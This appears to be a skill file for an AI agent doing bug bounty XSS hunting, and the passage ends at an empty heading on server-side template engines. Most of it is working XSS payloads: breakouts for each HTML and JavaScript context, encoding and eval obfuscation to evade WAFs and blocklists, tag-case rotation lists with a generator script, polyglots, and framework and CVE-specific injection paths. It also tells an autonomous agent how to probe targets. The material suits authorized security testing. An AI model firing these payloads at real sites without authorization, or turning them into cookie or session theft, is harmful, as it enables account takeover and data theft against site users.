---
name: xss
description: Comprehensive XSS hunting skill covering reflected, stored, and DOM-based XSS. Built from 178 public bug bounty reports plus the offsec reflected-XSS pack. Covers every injection context, framework escape hatch, CSP bypass, OAuth/OIDC XSS vectors, Swagger UI XSS, stored XSS playbook with canary/authorship proof, CRLF-to-XSS chain, context-specific payloads, tiered payload wordlist, and 6 chain compositions (cache poisoning, CSRF, OAuth ATO, SVG upload, postMessage, markdown/wiki). For markup injection that reflects raw HTML but does NOT execute JavaScript, see hunt-html-injection.
sources: github, hackerone_public, portswigger, owasp, bug_bounty_reports, cve_database
report_count: 178
---

## XSS Types and Classification

XSS occurs when attacker-controlled input is interpreted as executable code by a browser. Three distinct types:

| Type | Mechanism | Delivery |
|---|---|---|
| **Reflected** | Input reflected immediately in HTTP response without sufficient encoding | Victim clicks crafted link |
| **Stored** | Input persisted server-side, served to other users later | Victim views page with stored payload |
| **DOM-based** | Client-side JS reads attacker-controlled source (URL hash, `document.referrer`) and writes to dangerous sink — no server round-trip | Victim navigates to crafted URL |

**Reflected XSS** requires ALL five conditions:
1. Request-controlled input (query param, path, header, cookie, JSON body)
2. Immediate response reflection (echoed back in same HTTP response)
3. Insufficient context-specific encoding
4. Browser executes the value
5. Deliverable (victim can be induced to trigger the crafted request)

**What is NOT XSS:** Self-XSS (only attacker can trigger), HTML injection without execution (reflected but no script context reached), URL-encoded `%22onclick%3D…` in an attribute (browser does NOT decode URL encoding inside HTML attribute values, so `%22` stays literal).

---

## Request-to-Browser Pipeline

The pipeline from attacker input to browser execution has up to 16 transformation stages. Order matters — validation at the wrong stage can be bypassed.

```
Attacker input (query param, POST body, header, cookie)
  |
  +-- Stage 1:  URL decoding (web server / reverse proxy)
  +-- Stage 2:  Form body decoding (application/x-www-form-urlencoded)
  +-- Stage 3:  JSON/XML parsing
  +-- Stage 4:  Character-set conversion
  +-- Stage 5:  Unicode normalization (NFC/NFD/NFKC/NFKD)
  +-- Stage 6:  Framework parameter binding
  +-- Stage 7:  Proxy rewriting
  +-- Stage 8:  Application validation (allowlist/blocklist/regex)
  +-- Stage 9:  Business logic
  +-- Stage 10: Template engine rendering
  +-- Stage 11: Output encoding / sanitization
  +-- Stage 12: Response serialization
  |
  HTTP Response
  |
  +-- Stage 13: Browser HTML parsing (tokenization, tree construction)
  +-- Stage 14: Script execution
  +-- Stage 15: DOM mutation after parsing (innerHTML reparsing)
  +-- Stage 16: Client-side JS processing (hybrid reflected/DOM)
```

**Critical:** Encoding correct for stage 11 may be insufficient if stage 15 reverses it. A server emitting `&lt;script&gt;` is safe in HTML text, but client-side JS reading via `textContent` then assigning to `innerHTML` reverses the escaping.

**Validation ordering gap:** If the validator inspects URL-encoded form but the template engine receives the decoded form, validation was ineffective. Unicode normalization (NFKC) can map characters like U+FE64 (SMALL LESS-THAN SIGN) to `<` after validation.

**HTTP Parameter Pollution:** WAFs may inspect the first occurrence while the app uses the last (PHP/Ruby), or vice versa.

| Technology | Behavior with `?a=SAFE&a=PAYLOAD` |
|---|---|
| PHP | Takes LAST value (PAYLOAD) |
| ASP.NET | Joins all values (SAFE,PAYLOAD) |
| Python (Flask) | Takes FIRST value (SAFE) |
| Java (Servlet) | Takes FIRST value (SAFE) |
| Node.js (Express) | Returns array |
| Ruby (Rack) | Takes LAST value (PAYLOAD) |

---

## Input Surface Checklist

### URL-Based
| Source | Example | Test Pattern |
|---|---|---|
| Query parameter | `?q=VALUE` | Every GET endpoint that reflects the value |
| Path segment | `/category/VALUE/list` | Breadcrumbs, page titles, 404 messages |
| Matrix parameter | `/resource;sort=VALUE` | Framework-dependent |

### Request Body
| Source | Reflected Where |
|---|---|
| Form field (POST) | Error messages, validation feedback |
| JSON property | GraphQL variables, API error responses |
| XML value | SOAP, legacy XML APIs |
| Multipart filename | File upload error display |
| GraphQL variables | Schema error reflection |

### Headers
| Header | Reflected Where | Delivery |
|---|---|---|
| `Host` / `X-Forwarded-Host` | Page titles, canonical URLs, error pages | CRLF injection or controlled proxy |
| `Referer` | "Back" links, analytics | Link from attacker page |
| `User-Agent` | Debug pages, admin dashboards | Victim uses attacker-controlled UA |
| `Accept-Language` | Language selector errors | Limited character set |

### Application-Specific
| Source | Parameter Names |
|---|---|
| OAuth redirect | `redirect_uri`, `redirect_url`, `return_url`, `returnTo`, `next`, `continue`, `callback`, `redirect`, `destination`, `target` |
| OAuth error | `error`, `error_description` |
| OAuth state | `state` |
| API doc config | `url`, `configUrl` |
| Pagination / sort | `?sort=VALUE&order=asc` |
| Cookies | `lang=VALUE`, `utm_source=VALUE` |

---

## Browser Parsing Contexts

The HTML5 tokenizer state at the reflection point determines which characters are dangerous.

| Tokenizer State | Triggered By | `<` Starts Tags? | Character References? | Escape Method |
|---|---|---|---|---|
| **Data state** | Normal HTML | YES | YES | HTML entity encoding |
| **RCDATA** | `<title>`, `<textarea>` | NO | YES | Must inject `</title>` or `</textarea>` |
| **RAWTEXT** | `<style>`, `<xmp>`, `<iframe>`, `<noembed>`, `<noframes>` | NO | NO | Must inject matching end tag |
| **Script data** | `<script>` | Special (`</script>` only) | NO | `</script>` terminates regardless of JS context |
| **Attribute (double-quoted)** | `attr="..."` | -- | YES | Break with `"` |
| **Attribute (single-quoted)** | `attr='...'` | -- | YES | Break with `'` |
| **Attribute (unquoted)** | `attr=...` | -- | YES | Whitespace, `>`, `"`, `'`, backtick all break it |

### Triple-Layer Decoding

Browsers apply up to three independent decoding layers, creating bypass opportunities when filters only inspect the encoded form.

**Layer 1 — HTML entity decoding** (HTML text and attribute values):
- `&lt;` -> `<`, `&gt;` -> `>`, `&amp;` -> `&`, `&quot;` -> `"`, `&#x27;` -> `'`
- Decimal: `&#60;` -> `<`
- Hex: `&#x3C;` -> `<`
- NOT applied inside `<script>` or `<style>` RAWTEXT content

**Layer 2 — URL decoding** (href, src, action, URL-bearing attributes):
- `%3C` -> `<`, `%22` -> `"`
- Applied AFTER HTML entity decoding in attributes
- Double encoding: `%253C` -> `%3C` -> `<` (if server also URL-decodes)

**Layer 3 — JavaScript decoding** (inside JS execution contexts):
- Unicode escapes: `\u003C` -> `<`, `\u{3C}` -> `<`
- Hex escapes: `\x3C` -> `<`
- Octal: `\074` -> `<` (non-strict mode only)
- Applied AFTER HTML entity decoding in event-handler attributes

**Critical implication for event handlers:** In `onclick="handleClick('VALUE')"`, the browser HTML-entity-decodes the attribute first, then passes the result to JavaScript. So `&#x27;` becomes `'` before JS evaluation, allowing string breakout via HTML entities.

**Browser engine differences relevant to XSS:**

| Feature | Blink (Chrome/Edge) | Gecko (Firefox) | WebKit (Safari) |
|---|---|---|---|
| XSS Auditor | Removed (Chrome 78, 2019) | Never implemented | Removed (Safari 13, 2019) |
| Trusted Types | Supported (Chrome 83+) | Not supported | Not supported |
| `popover` attribute | Chrome 114+ | Firefox 125+ | Safari 17+ |
| `accesskey` on hidden inputs | Fires onclick | Fires onclick | Not confirmed |

---

## Autonomous Testing Priority

**Verify reflection before claiming XSS — encoding is everything.**

Your payload must appear in the response body with angle brackets UNESCAPED. `<script>` is XSS. `&lt;script&gt;` is safe encoding — not vulnerable.

**JavaScript dialog methods: `alert(1)`, `confirm(1)`, `prompt(1)`.** These three dialog calls are the canonical proof set. All of them are visible JavaScript dialogs that block the page until handled, which makes the finding observable to a human operator and cancellable mid-run.

| Primitive | Dialog behavior | Use when |
|---|---|---|
| `alert(1)` | Notice with an OK button | Default first probe; cheapest confirmation |
| `confirm(1)` | OK / Cancel, returns boolean | `alert` is blacklisted or filtered but `confirm` is not |
| `prompt(1)` | Text-input dialog, returns string | `alert` and `confirm` are both blocked, or input handling is part of the test |

If one primitive is filtered, **try the next before concluding "not vulnerable"** — naive blacklists block `alert(` and forget `confirm(` / `prompt(`. Escaped or stripped output is still safe; a missing dialog with raw output means the sink did not execute and you need a different context. If the reflection is fully entity-encoded (`&lt;`, `&quot;`, `&#039;`), the parameter is a dead end — see **HTML-Entity Encoding** and skip it.

If **all three** are blocked or filtered, do not abandon the sink: keep the same trio and obfuscate the name/call syntax per **Dialog Fallback** below. If the *tag name itself* is what is blocked (not the dialog name), rotate the casing per **Tag-Name Case Variations** first — that is a cheaper bypass than full obfuscation.

**Canary discipline:** when the page contains example payloads (`alert(1)`, `alert('XSS')`), substitute a unique number, e.g. `alert(778815)` / `confirm(778815)` / `prompt(778815)`, so your execution is distinguishable from decoys. Use the literal `1` when there is no decoy noise, and always keep the dialog function the proof requires.

**Try these contexts in order:**

0. **Context balancing prefix — put `'"<>` before every tag-based payload.** `'` closes a single-quoted attribute or JS string, `"` closes a double-quoted one, and `<` `>` break out of / stress the tag context, so an unknown reflection context is neutralized before `<script>` or `<svg>` is parsed. This is the default probe shape; the plain payload (no prefix) is the fallback once the context is known:
   ```
   ?q='"<><script>alert(1)</script>
   ?q='"<><script>confirm(1)</script>
   ?q='"<><script>prompt(1)</script>
   ?utm_source='"<><svg onload=alert(1)>
   ```
   If the reflected prefix comes back as `&quot;` / `&#39;` / `&lt;`, output encoding is active — check whether only some characters are escaped before escalating, and if the whole set is escaped treat the parameter as encoded and move on (see **HTML-Entity Encoding**).

1. **Inline script injection** (works when HTML context allows new tags):
   ```
   '"<><script>alert(1)</script>
   '"<><script>confirm(1)</script>
   '"<><script>prompt(1)</script>
   ```
   Confirmed when the balanced payload appears literally (not HTML-encoded) in the response **and** a dialog actually fires in a browser.

   If `<script>` is stripped but the rest of the payload reflects, rotate the tag casing (`<ScRiPt>`, `<sCrIpT>`, `<SCRIPT>`) before changing technique — see **Tag-Name Case Variations**.

2. **Attribute event injection** (when `<` is filtered but attributes are injectable) — the leading `"` of the balancing prefix is what closes a double-quoted attribute; use the bare quote form when `<`/`>` are stripped:
   ```
   '"<>" onmouseover="alert(1)
   " onmouseover="alert(1)
   " onerror="confirm(1)
   " onload="prompt(1)
   ```

3. **URL/href context:**
   ```
   javascript:alert(1)
   javascript:confirm(1)
   javascript:prompt(1)
   ```

**Distinguishing success from failure:**
- **Vulnerable:** the balanced payload (`'"<><script>alert(1)`) comes back unescaped **and** the dialog fires in a real browser
- **Filtered/safe:** response contains `&lt;script&gt;` or `&#x3C;script&#x3E;` — properly encoded. If the full set (`&amp;` `&quot;` `&#039;` `&lt;` `&gt;`) is encoded, this is `htmlspecialchars()`-class encoding: skip this parameter and move to the next (see **HTML-Entity Encoding** for the three exceptions worth a quick check).
- **Blocked:** response is an error, the reflected value is absent, or the page renders without a dialog. Before concluding, rotate tag casing (**Tag-Name Case Variations**) and, if all three dialog names are filtered, use **Dialog Fallback**.

**Visible, cancellable dialog runs (ego-browser / guarded browser):** dialogs only prove execution if the operator can see them and stop the run. Keep the dialog on screen long enough to be observed, then handle it explicitly — never leave it blocking the tab:

```js
await page.goto(pocUrl);
const info = await page.info();
// Then choose one, exactly once:
await page.dismissDialog();               // for the user who wants to cancel
await page.acceptDialog();                // OK / close
await page.acceptDialog("text");          // prompt() input
```

**For stored XSS:** storing the payload is not the finding — a *render surface* that shows it unencoded to a *different viewer* is. Inject into a field other pages display (comments, usernames, profile signature, report/collection names, ticket titles), then enumerate every place that value is rendered. The full loop is in **Stored XSS Playbook** below.

---

## HTML-Entity Encoding — `htmlspecialchars()` means skip the parameter

PHP `htmlspecialchars()` — and the equivalent auto-escapers in Rails ERB, Django/Jinja autoescape, Go `html/template`, Python `html.escape(quote=True)`, ASP.NET `<%: %>` — converts HTML metacharacters into entities:

| Input | Output | Escaped? |
|---|---|---|
| `&` | `&amp;` | yes |
| `"` | `&quot;` | yes |
| `'` | `&#039;` (or `&apos;`) | only with `ENT_QUOTES` (PHP >= 8.1 default); **raw** under `ENT_COMPAT` |
| `<` | `&lt;` | yes |
| `>` | `&gt;` | yes |

**The rule: when a parameter reflects with all five encoded, stop payloading it. Mark it `encoded (htmlspecialchars)`, skip that parameter, and move to the next parameter / endpoint / sink.**

**Probe with one request:** send `aaa"bbb'ccc<ddd>eee&fff` and look at the reflection. `aaa&quot;bbb&#039;ccc&lt;ddd&gt;eee&amp;fff` = `htmlspecialchars($x, ENT_QUOTES)` -> skip. `aaa&quot;bbb'ccc&lt;ddd&gt;eee&amp;fff` (single quote still raw) = `ENT_COMPAT` -> exception 1 below.

**Three 30-second exceptions — test these before you skip:**

1. **`'` comes back raw.** Pre-8.1 PHP defaults to `ENT_COMPAT`, which encodes `"` but not `'`, and an explicit `ENT_COMPAT` does the same today. Single-quoted attributes are then still breakable:
   ```html
   ' onmouseover='alert(1)
   ' autofocus onfocus='alert(1)
   ```
2. **The value sits in an unquoted attribute, a backtick attribute, or a URL attribute (`href`, `src`, `action`, `formaction`).** `htmlspecialchars()` never encodes `` ` ``, `=`, `/`, `:`, `(`, `)`, so these survive unchanged:
   ```html
   x onmouseover=alert(1)
   ` onmouseover=alert(1)
   javascript:alert(1)
   data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
   ```
3. **The entity gets decoded later.** If the encoded value is stored and a downstream template calls `html_entity_decode()`, or client JS reads it and assigns to `innerHTML`, the entities turn back into live markup. Check the stored / re-rendered page, not just the first response.

---

## Dialog Fallback — when `alert` / `confirm` / `prompt` are all blocked

When the app strips, encodes, or WAF-blocks all three dialog names but the sink still executes JavaScript, keep the same dialog and obfuscate the **name** and/or **call syntax**.

| Family | `alert(1)` example | Executes in | Needs `eval` |
|---|---|---|---|
| Decimal entity — name | `<img src=x onerror="&#97;lert(1)">` | HTML attribute / text | no |
| Decimal entity — call | `<img src=x onerror="alert&#40;1&#41;">` | HTML attribute / text | no |
| Hex entity | `<img src=x onerror="&#x61;lert(1)">`, `&#x000061;lert(1)` | HTML attribute / text | no |
| Unicode identifier escape | `<script>\u0061lert(1)</script>`, `ale\u0072t(1)` | JS source (script / handler) | no |
| Bracket + concat | `<script>window['ale'+'rt'](1)</script>` | JS source | no |
| String concatenation | `<script>eval("a"+"lert(1)")</script>` | JS source | yes |
| Base64 + `atob` | `<script>eval(atob('YWxlcnQoMSk='))</script>` | JS source | yes |
| URL decode | `<script>eval(decodeURIComponent('alert%281%29'))</script>` | JS source | yes |
| `fromCharCode` | `<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>` | JS source | yes |
| Reversed string | `<script>eval('trela'.split('').reverse().join('')+'(1)')</script>` | JS source | yes |
| Variable obfuscation | `<script>var _='alert';eval(_+'(1)')</script>` | JS source | yes |
| Function constructor | `<script>new Function('alert(1)')()</script>` | JS source | yes |
| Mixed encoding | `<script>eval('\u0061\u006c'+String.fromCharCode(101,114,116)+'(1)')</script>` | JS source | yes |

**Same families for the other two dialogs** (swap the encoded constants):

| Dialog | Base64 | `fromCharCode` codes | Reversed |
|---|---|---|---|
| `confirm(1)` | `Y29uZmlybSgxKQ==` | `99,111,110,102,105,114,109,40,49,41` | `mrifnoc` |
| `prompt(1)` | `cHJvbXB0KDEp` | `112,114,111,109,112,116,40,49,41` | `tpmorp` |

**Selection order:** entity / unicode / bracket families first (no `eval`, survive a strict `script-src`) -> concat / `atob` / `fromCharCode` / reverse / variable / `Function` (all `eval`-class) -> mixed encoding when a WAF normalizes single-family payloads.

**Context rule:** HTML entities (`&#97;`, `&#x61;`, `&#40;`) are decoded by the HTML parser in attributes, text, and `srcdoc` — **not** inside `<script>`, whose content is raw text. Unicode identifier escapes (`\u0061lert`) work in JS source, **not** in HTML text/attributes. Pick the family that matches the sink.

**CSP rule:** if the response has a CSP without `unsafe-eval`, every `eval` / `Function` / `atob`-decoded payload is dead. Stay in the no-eval rows and change the sink instead (event handler, `javascript:` URL, SVG `onload`).

---

## Tag-Name Case Variations — when `<script>` (or the whole tag) is blocked

**Rule:** HTML tag names are ASCII case-insensitive. `<ScRiPt>`, `<sCrIpT>` and `<SCRIPT>` all parse to the same `script` element. Attribute **names** are case-insensitive too (`ONERROR=`, `OnLoAd=`), but the JavaScript inside them is case-sensitive — never vary `alert`/`confirm`/`prompt`, the document object, or property names.

```html
'"<><ScRiPt>alert(1)</sCrIpT>
'"<><sCrIpT>confirm(1)</ScRiPt>
'"<><SCRIPT>prompt(1)</SCRIPT>
'"<><IMG SRC=x OnErRoR=alert(1)>
'"<><ImAgE src=x ONERROR=alert(1)>
'"<><SvG OnLoAd=alert(1)>
'"<><SvG/OnLoAd=alert(1)>
'"<><AuDiO src=x OnErRoR=alert(1)>
'"<><ViDeO src=x OnErRoR=alert(1)>
```

**`<script>` — 64 variants** (primary — executes inline JS)
```html
<script>
<Script>
<sCript>
<SCript>
<scRipt>
<ScRipt>
<sCRipt>
<SCRipt>
<scrIpt>
<ScrIpt>
<sCrIpt>
<SCrIpt>
<scRIpt>
<ScRIpt>
<sCRIpt>
<SCRIpt>
<scriPt>
<ScriPt>
<sCriPt>
<SCriPt>
<scRiPt>
<ScRiPt>
<sCRiPt>
<SCRiPt>
<scrIPt>
<ScrIPt>
<sCrIPt>
<SCrIPt>
<scRIPt>
<ScRIPt>
<sCRIPt>
<SCRIPt>
<scripT>
<ScripT>
<sCripT>
<SCripT>
<scRipT>
<ScRipT>
<sCRipT>
<SCRipT>
<scrIpT>
<ScrIpT>
<sCrIpT>
<SCrIpT>
<scRIpT>
<ScRIpT>
<sCRIpT>
<SCRIpT>
<scriPT>
<ScriPT>
<sCriPT>
<SCriPT>
<scRiPT>
<ScRiPT>
<sCRiPT>
<SCRiPT>
<scrIPT>
<ScrIPT>
<sCrIPT>
<SCrIPT>
<scRIPT>
<ScRIPT>
<sCRIPT>
<SCRIPT>
```

**`<svg>` — 8 variants** (onload)
```html
<svg>
<Svg>
<sVg>
<SVg>
<svG>
<SvG>
<sVG>
<SVG>
```

**`<img>` — 8 variants** (onerror)
```html
<img>
<Img>
<iMg>
<IMg>
<imG>
<ImG>
<iMG>
<IMG>
```

**`<image>` — 32 variants** (aliased to `img` by the HTML parser)
```html
<image>
<Image>
<iMage>
<IMage>
<imAge>
<ImAge>
<iMAge>
<IMAge>
<imaGe>
<ImaGe>
<iMaGe>
<IMaGe>
<imAGe>
<ImAGe>
<iMAGe>
<IMAGe>
<imagE>
<ImagE>
<iMagE>
<IMagE>
<imAgE>
<ImAgE>
<iMAgE>
<IMAgE>
<imaGE>
<ImaGE>
<iMaGE>
<IMaGE>
<imAGE>
<ImAGE>
<iMAGE>
<IMAGE>
```

**`<audio>` — 32 variants** (onerror)
```html
<audio>
<Audio>
<aUdio>
<AUdio>
<auDio>
<AuDio>
<aUDio>
<AUDio>
<audIo>
<AudIo>
<aUdIo>
<AUdIo>
<auDIo>
<AuDIo>
<aUDIo>
<AUDIo>
<audiO>
<AudiO>
<aUdiO>
<AUdiO>
<auDiO>
<AuDiO>
<aUDiO>
<AUDiO>
<audIO>
<AudIO>
<aUdIO>
<AUdIO>
<auDIO>
<AuDIO>
<aUDIO>
<AUDIO>
```

**`<video>` — 32 variants** (onerror)
```html
<video>
<Video>
<vIdeo>
<VIdeo>
<viDeo>
<ViDeo>
<vIDeo>
<VIDeo>
<vidEo>
<VidEo>
<vIdEo>
<VIdEo>
<viDEo>
<ViDEo>
<vIDEo>
<VIDEo>
<videO>
<VideO>
<vIdeO>
<VIdeO>
<viDeO>
<ViDeO>
<vIDeO>
<VIDeO>
<vidEO>
<VidEO>
<vIdEO>
<VIdEO>
<viDEO>
<ViDEO>
<vIDEO>
<VIDEO>
```

> Generate full rotation lists with:
> ```bash
> python3 - <<'EOF'
> for tag in ("script","svg","img","image","audio","video"):
>     idx=[i for i,c in enumerate(tag) if c.isalpha()]
>     for m in range(1<<len(idx)):
>         t=list(tag)
>         for b,p in enumerate(idx):
>             if m>>b&1: t[p]=t[p].upper()
>         print("<"+"".join(t)+">")
>     print()
> EOF
> ```

**Field notes (verified in headless Chrome):**
- `<img2>`, `<img3>`, `<image2>`, `<image3>` are NOT HTML elements — their `onerror` never fires. Use only as **case-sensitivity probes** to determine if the filter is tag-name-based.
- `<svg/onload=...>` (slash instead of space) additionally defeats regexes written as `<svg onload`.
- If the filter **lowercases or normalizes the whole input** before matching, no casing variant survives — pivot to **Dialog Fallback** entity/`\u`/`atob` families.

---

## Context-Specific Payloads

### HTML Body (Between Tags)

**Context:** `<div>VALUE</div>`, `<p>Your search: VALUE returned 0 results</p>`

**Auto-fire (no click needed):**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video autoplay onplay=alert(1)><source src=x></video>
<audio autoplay onplay=alert(1)><source src=x></audio>
```

**Nested bypass** (filter removes `<script>` once — becomes `<script>` after removal):
```
<scr<script>ipt>alert(1)</scr</script>ipt>
```

**Event handlers that fire without user interaction:**

| Event | Tag | Notes |
|---|---|---|
| `onload` | `<img>`, `<iframe>`, `<body>`, `<svg>` | Fires on resource load/error |
| `onerror` | `<img src=x>`, `<video>`, `<audio>` | Fires on load failure |
| `onfocus` + `autofocus` | `<input>`, `<select>`, `<textarea>` | Auto-fires on page load |
| `ontoggle` | `<details open>` | Fires when open attribute present |
| `onstart` | `<marquee>` | Fires when marquee starts |
| `onanimationend` | Any element with CSS animation | Fires when animation completes |
| `onpageshow` | `<body>` | Fires on page load |
| `onhashchange` | `<body>` | Fires when URL hash changes |

### HTML Attributes — Double-Quoted

**Context:** `<input value="VALUE" />`

```
VALUE" autofocus onfocus=alert(1) x="
VALUE" onmouseover=alert(1) x="
VALUE"><img src=x onerror=alert(1)>
VALUE"><svg onload=alert(1)>
VALUE" accesskey=x onclick=alert(1) x="
```

### HTML Attributes — Single-Quoted

```
VALUE' autofocus onfocus=alert(1) x='
VALUE'><img src=x onerror=alert(1)>
VALUE'><svg onload=alert(1)>
```

### HTML Attributes — Unquoted

**Context:** `<div class=VALUE>` — whitespace, `>`, `"`, `'`, backtick all terminate the value.

```
VALUE onmouseover=alert(1)
VALUE><img src=x onerror=alert(1)>
VALUE><svg onload=alert(1)>
VALUE autofocus onfocus=alert(1)
```

### Event-Handler Attributes

**Context:** `<div onclick="doSomething('VALUE')">` or `<a href="#" onclick="track('VALUE')">`

**Break JS string AND HTML attribute:**
```
VALUE');alert(1)//
VALUE'-alert(1)-'
VALUE\');alert(1)//
```

**Backslash-escaping bypass** (app escapes `'` to `\'` but NOT `\`):
```
Input:   \');alert(1)//
Output:  \\');alert(1)//
Result:  \\ = literal backslash, ' terminates string
```

**HTML entity bypass** (browser HTML-decodes attribute before passing to JS):
```
&#x27;);alert(1)//
&#39;);alert(1)//
&apos;);alert(1)//
```

### URL-Bearing Attributes (href, src, action, formaction)

**Context:** `<a href="VALUE">`, `<form action="VALUE">`

**javascript: protocol injection:**
```
javascript:alert(1)
javascript:alert(document.domain)
JAVASCRIPT:alert(1)
Javascript:alert(1)
java script:alert(1)
java&#x09;script:alert(1)
java&#x0A;script:alert(1)
java%09script:alert(1)
&#x6A;avascript:alert(1)
```

Chrome, Firefox, and Safari all execute `javascript:` in href on click. React 19+ blocks this in JSX but earlier versions do not.

### JavaScript String Contexts

**Context:** `<script>var q = 'VALUE';</script>` or `<script>var msg = "VALUE";</script>`

**Single-quote breakout:**
```
VALUE';alert(1)//
VALUE'-alert(1)-'
VALUE';alert(1);var x='
```

**Double-quote breakout:**
```
VALUE";alert(1)//
VALUE"-alert(1)-"
```

**Template literal breakout** (`` <script>var x = `VALUE`;</script> ``):
```
${alert(1)}
${alert(document.domain)}
`-alert(1)-`
```
No quote termination needed — `${...}` executes inside the template literal.

**Script block termination** (HTML parser runs BEFORE JS engine — `</script>` always ends the block):
```
VALUE</script><svg onload=alert(1)>
VALUE</script><img src=x onerror=alert(1)>
</SCRIPT><script>alert(1)</script>
```

### Inline JSON in Script Tag

**Context:** `<script>var config = {"query":"VALUE","page":1};</script>`

```
VALUE","x":"</script><img src=x onerror=alert(1)>
VALUE"};alert(1)//
</script><script>alert(1)</script>
VALUE</scri\u0070t>
```

The correct server-side defense is encoding `<` as `\u003C` inside JSON within `<script>` blocks.

### RCDATA Contexts (title, textarea)

**Context:** `<title>VALUE</title>` or `<textarea>VALUE</textarea>`

Inside RCDATA, `<` does NOT start tags. Only the matching end tag escapes:
```
VALUE</title><script>alert(1)</script>
VALUE</textarea><script>alert(1)</script>
VALUE</title><img src=x onerror=alert(1)>
```

### HTML Comments

**Context:** `<!-- Your search: VALUE -->`

```
VALUE--><script>alert(1)</script>
VALUE--!><img src=x onerror=alert(1)>
```

### SVG/MathML Namespace

```html
<svg><script>alert(1)</script></svg>
<svg onload=alert(1)>
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
```

HTML integration points within SVG (switch back to HTML parsing):
- `<foreignObject>`, `<desc>`, `<title>` within SVG
- `<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>` within MathML

**Namespace confusion DOMPurify bypass pattern:** In SVG namespace, `<style>` is NOT RAWTEXT — a sanitizer that treats it as RAWTEXT misses injections within it.

### iframe srcdoc

**Context:** `<iframe srcdoc="VALUE"></iframe>`

The srcdoc value is HTML-entity-decoded (it's an attribute), then parsed as a full HTML document inheriting the parent's origin.

```
VALUE<script>alert(parent.document.cookie)</script>
VALUE"><script>alert(1)</script>
```

### Hidden Input + accesskey

If attacker controls attributes on a hidden input:
```html
<input type="hidden" accesskey="X" onclick="alert(1)" />
```
Trigger: ALT+SHIFT+X (Firefox), ALT+X (Chrome on some platforms). Makes previously unexploitable reflections exploitable with minor user interaction.

---

## Encoding Bypass Payloads

### HTML Entity Bypass

For filters blocking `<`, `>`, `"` literally but not encoded forms:
```
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```
Only works if the browser HTML-decodes in that context (not inside `<script>` RAWTEXT).

### URL Encoding

```
%3Cscript%3Ealert(1)%3C/script%3E
%22%3E%3Csvg%20onload%3Dalert(1)%3E
```

**Double URL encoding:**
```
%253Cscript%253E  -> (server decodes) -> %3Cscript%3E -> (browser) -> <script>
```

### Unicode Bypass (in JS contexts)

```
\u003Cscript\u003Ealert(1)\u003C/script\u003E
\x3Cscript\x3E
```

**Unicode normalization bypass** (NFKC maps lookalike chars):
- U+FE64 (SMALL LESS-THAN SIGN) normalizes to `<` after NFKC
- U+FE65 (SMALL GREATER-THAN SIGN) normalizes to `>`
- Applies when server validates before normalizing

### Whitespace and Special Chars Between Attribute Name and Value

```
<img src=x onerror=alert(1)>           (space)
<img src=x onerror =alert(1)>          (tab, 0x09)
```

---

## Polyglot Payloads

Payloads designed to work across multiple contexts:

```
'"--></style></script><svg/onload=alert(1)>
```

```
'`"><svg onload=alert(1)><!--
```

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

```
<svg><script>alert&lpar;1&rpar;</script>
```

**Attribute polyglot:**
```
"onmouseover="alert(1)" x="
'onmouseover='alert(1)' x='
```

**JS string polyglot:**
```
';alert(1)//
";alert(1)//
`;alert(1)//
${alert(1)}
\');alert(1)//
```

---

## Framework-Specific Escape Hatches

### React / Next.js

**Default protection:** JSX auto-escapes all string interpolations via `textContent`.

**Dangerous escape hatches:**
```jsx
// Bypasses all React escaping
<div dangerouslySetInnerHTML={{__html: userInput}} />

// javascript: URL (dangerous in React < 19)
<a href={userInput}>Link</a>

// Direct DOM manipulation
inputRef.current.innerHTML = userInput;
```

**Next.js SSR hydration:**
```html
<!-- type="application/json" means NOT directly executed -->
<!-- BUT client-side code using this via innerHTML creates hybrid XSS -->
<script id="__NEXT_DATA__" type="application/json">
  {"props":{"pageProps":{"query":"VALUE"}}}
</script>
```

**Detection:** `__NEXT_DATA__` in page source, `data-reactroot` attribute

### Vue / Nuxt

**Default protection:** `{{ value }}` double-curly-brace auto-encodes HTML.

**Dangerous escape hatches:**
```html
<div v-html="userInput"></div>
<a :href="userInput">Link</a>
<div v-bind="userControlledObject">
```

**CVEs:** CVE-2026-46342 (Nuxt Nitro Server XSS), SNYK-JS-NUXT-7640972

**Detection:** `__NUXT__` or `__NUXT_DATA__` in page source

### Angular

**Default protection:** Template interpolation `{{ value }}` and `DomSanitizer` strip unsafe HTML.

**Dangerous escape hatches:**
```typescript
this.sanitizer.bypassSecurityTrustHtml(userInput)
this.sanitizer.bypassSecurityTrustScript(userInput)
this.sanitizer.bypassSecurityTrustUrl(userInput)
this.sanitizer.bypassSecurityTrustResourceUrl(userInput)
this.sanitizer.bypassSecurityTrustStyle(userInput)
this.elementRef.nativeElement.innerHTML = userInput;
```

**Detection:** `ng-version` attribute on root element

### Svelte / SvelteKit

**Default protection:** `{value}` auto-encodes HTML.

**Dangerous escape hatches:**
```html
{@html userInput}
<Fragment set:html={userInput} />
```

**Detection:** `data-svelte-h` attributes

### Astro

**CVE-2025-64764** (CVSS 7.1, Astro <= 5.15.6, fixed 5.15.8):
Server islands at `/_server-islands/[name]` accept `e` (export), `p` (props), `s` (slot content).
When `e=file`, the server returns the island file path using `markHTMLString` (skips escaping).

```
/_server-islands/MyIsland?e=file&s=<script>alert(1)</script>
```

**Detection:** `data-astro-*` attributes

### HTMX

**Default protection:** NONE. All security is the server's responsibility.

**Dangerous features:**
```html
<button hx-on:click="alert(1)">
<div hx-on::load="eval(userInput)">
```

All HTMX swap operations use innerHTML-equivalent. Incompatible with strict CSP.

**Detection:** `hx-*` attributes on elements

### Alpine.js

**Default protection:** NONE. Expressions in `x-data`, `x-bind`, `x-on`, `x-html` are evaluated as JavaScript.

**Dangerous features:**
```html
<div x-html="userInput"></div>
<div x-bind="userControlledObject">
<button x-on:click="eval(userInput)">
```

**Detection:** `x-data`, `x-bind` attributes

### Server-Side Template Engines

